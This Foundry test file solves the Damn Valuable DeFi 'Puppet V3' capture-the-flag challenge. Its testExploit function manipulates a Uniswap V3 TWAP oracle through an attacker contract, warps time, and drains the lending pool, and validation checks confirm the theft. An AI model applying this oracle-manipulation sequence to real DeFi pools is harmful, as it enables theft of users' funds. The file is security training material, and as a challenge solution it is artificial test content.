// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";

import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";

import {PuppetV3Pool} from "../../../src/Contracts/puppet-v3/PuppetV3Pool.sol";

import {Attacker} from "../../../src/Contracts/puppet-v3/Attacker.sol";

import {
    IUniswapV3Pool,
    IUniswapV3Factory,
    ISwapRouter,
    INonfungiblePositionManager
} from "../../../src/Contracts/puppet-v3/interfaces.sol";

interface IWETH {
    function approve(address, uint256) external returns (bool);

    function withdraw(uint256) external;

    function deposit() external payable;

    function balanceOf(address) external view returns (uint256);
}

contract PuppetV3 is Test {
    uint256 internal constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;

    uint256 internal constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 internal constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    uint256 internal constant DEPLOYER_INITIAL_ETH_BALANCE = 200e18;

    uint256 internal constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1000000e18;

    uint24 internal constant FEE = 3000;
    uint160 internal constant SQRTPRICEX96 = 79228162514264337593543950336;

    IUniswapV3Pool internal uniswapV3Pool;
    IUniswapV3Factory internal uniswapV3Factory;
    ISwapRouter internal uniswapRouter;
    INonfungiblePositionManager internal uniswapPositionManager;

    DamnValuableToken internal dvt;
    IWETH internal weth;

    PuppetV3Pool internal puppetV3Pool;
    Attacker internal attackerContract;

    address payable internal attacker;
    address payable internal deployer;
    uint256 initialBlockTimestamp;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, PLAYER_INITIAL_ETH_BALANCE);

        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
        vm.label(deployer, "deployer");
        vm.deal(deployer, DEPLOYER_INITIAL_ETH_BALANCE);

        vm.startPrank(deployer);

        //init UniswapV3Factory
        uniswapV3Factory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
        vm.label(address(uniswapV3Factory), "uniswapV3Factory");

        //init WETH
        weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        vm.label(address(weth), "WETH");

        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        //init NonfungiblePositionManager
        uniswapPositionManager = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
        vm.label(address(uniswapPositionManager), "uniswapPositionManager");

        //init SwapRouter
        uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        vm.label(address(uniswapRouter), "uniswapRouter");

        (address token0, address token1) =
            address(weth) < address(dvt) ? (address(weth), address(dvt)) : (address(dvt), address(weth));
        uniswapPositionManager.createAndInitializePoolIfNecessary(token0, token1, FEE, SQRTPRICEX96);

        (uint256 amount0Desired, uint256 amount1Desired) = address(weth) < address(dvt)
            ? (UNISWAP_INITIAL_WETH_LIQUIDITY, UNISWAP_INITIAL_TOKEN_LIQUIDITY)
            : (UNISWAP_INITIAL_TOKEN_LIQUIDITY, UNISWAP_INITIAL_WETH_LIQUIDITY);
        uniswapPositionManager.createAndInitializePoolIfNecessary(token0, token1, FEE, SQRTPRICEX96);
        address uniswapPoolAddress = uniswapV3Factory.getPool(address(weth), address(dvt), FEE);

        //init UniswapV3Pool
        uniswapV3Pool = IUniswapV3Pool(uniswapPoolAddress);
        vm.label(address(uniswapV3Pool), "uniswapV3Pool");

        uniswapV3Pool.increaseObservationCardinalityNext(40);

        weth.approve(address(uniswapPositionManager), type(uint256).max);

        dvt.approve(address(uniswapPositionManager), type(uint256).max);

        INonfungiblePositionManager.MintParams memory params = INonfungiblePositionManager.MintParams({
            token0: token0,
            token1: token1,
            fee: FEE,
            tickLower: -60,
            tickUpper: 60,
            amount0Desired: amount0Desired,
            amount1Desired: amount1Desired,
            amount0Min: 0,
            amount1Min: 0,
            recipient: deployer,
            deadline: block.timestamp * 2
        });

        //provides liquidity minting ERC721 position
        uniswapPositionManager.mint(params);

        puppetV3Pool = new PuppetV3Pool(address(weth), address(dvt), address(uniswapV3Pool));
        vm.label(address(puppetV3Pool), "puppetV3Pool");

        dvt.transfer(attacker, PLAYER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV3Pool), LENDING_POOL_INITIAL_TOKEN_BALANCE);

        vm.warp(block.timestamp + (3 * 24 * 60 * 60)); // block.timestamp = 3 * 24 * 60 * 60
        vm.roll(block.number + 1);
        vm.stopPrank();

        //deploying Attacker contract
        vm.prank(attacker);
        attackerContract = new Attacker(address(uniswapRouter), address(puppetV3Pool), address(dvt),address(weth));

        initialBlockTimestamp = block.timestamp;
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        dvt.approve(address(attackerContract), type(uint256).max);

        // STEP 1
        attackerContract.movePrice();

        // STEP 2
        // updates the block.timestamp to block.timestamp + 105
        //1.75 minutes
        vm.warp(block.timestamp + 105);
        // updates the block.number to block.number + 1
        vm.roll(block.number + 1);

        // STEP3
        attackerContract.borrowFromPoolAtCheap();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // Attacker has taken all tokens from the pool
        assertLt(block.timestamp - initialBlockTimestamp, 115);
        assertEq(dvt.balanceOf(address(puppetV3Pool)), 0);
        assertGe(dvt.balanceOf(attacker), LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }
}
